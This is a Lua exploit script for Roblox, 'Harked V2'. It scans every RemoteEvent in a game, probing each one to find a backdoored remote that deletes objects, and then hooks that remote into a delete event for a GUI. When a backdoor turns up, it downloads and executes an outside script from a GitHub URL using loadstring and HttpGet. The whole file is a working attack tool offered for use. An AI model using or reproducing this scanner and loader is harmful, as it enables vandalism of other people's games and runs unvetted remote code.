-- // credits for the STRAWBERRY team
local timer = 0; -- // times how long it takes to load the script
local backdoorfound = false; -- // this will turn to true or false depending on if vuln found
local vulnremote = nil; -- // if a remote with a vuln or backdoor is found it will be referenced in this variable

local safetime = 0.25; -- // lower will cause faster scan times but it will mess up more and have false positives
-- // higher numbers (like 0.25 which is the default) will take longer but be a good scanner
-- // 0.25 is the best for all situations and prob wont need to be changed

local scanninghint = Instance.new("Hint", workspace); -- // creates a hint to track scanner progress for the skids
scanninghint.Text = "Harked V2: Scanning Game. Be patient. (Check F9 menu for progress) (Game might freeze for a bit)";

coroutine.wrap(function()
	repeat
		timer += 0.01;
		task.wait(0.01);
	until backdoorfound;
end)(); -- // creates a timer in a seperate thread so we can time the scanner

local deletebind = Instance.new("BindableEvent", game.Players.LocalPlayer);
deletebind.Name = "deletebind";
deletebind.Event:Connect(function(item)
	if backdoorfound == true then
		vulnremote:FireServer(item);
	end;
end); -- // creates a delete event with the backdoored remote so the gui can use it

local function remoteBackdoored(remote)
	local function testfire(item)
		pcall(function()
			remote:FireServer(item);			
		end);
	end;
	local function isDestroyed(obj)
		return obj == nil or obj.Parent == nil;
	end;
	local testpart = game.Players.LocalPlayer.StarterGear;
	testfire(testpart);
	task.wait(safetime); -- // slight delay to see if remote reacts
	print("Harked V2: "..remote.Name.." /isbackdoored: "..tostring(isDestroyed(testpart)).." / "..remote:GetFullName());
	if isDestroyed(testpart) then
		vulnremote = remote;
		return true;
	end;
	return false;
end; -- // checks a remote event for a backdoor or vulnerability by firing it and seeing if it does something

local function scan()
	if backdoorfound then return end;
	for i, v in ipairs(game:GetDescendants()) do
		if v:IsA("RemoteEvent") then
			if not v.Parent then continue end;
			if v.Parent.Name == "RobloxReplicatedStorage" then continue end;
			if remoteBackdoored(v) == true then
				backdoorfound = true;
				print("found!");
				return; -- // backdoor found so breaks the loop
			else
				-- // keeps scanning if a backdoor isent found
			end; -- // tests remote for backdoor
		end;
	end;
end; -- // scans a place for vulnerable remotes

task.wait(2); -- // 2 sec delay before scanning to stop huge lag spike
scan(); -- // scans the WHOLE game for vuln/backdoored remotes
task.wait();
if backdoorfound then
	-- // loads up the gui
	loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxexploiter691/harked-v2/refs/heads/main/harkedv2.lua"))();
	scanninghint.Text = "Harked V2: Backdoor found in "..tostring(timer).." seconds! (Backdoored Remote name: "..vulnremote.Name..")";
	task.wait(10);
	scanninghint:Destroy();
else
	scanninghint.Text = "Harked V2: No backdoor found.";
	task.wait(10);
	scanninghint:Destroy();
end;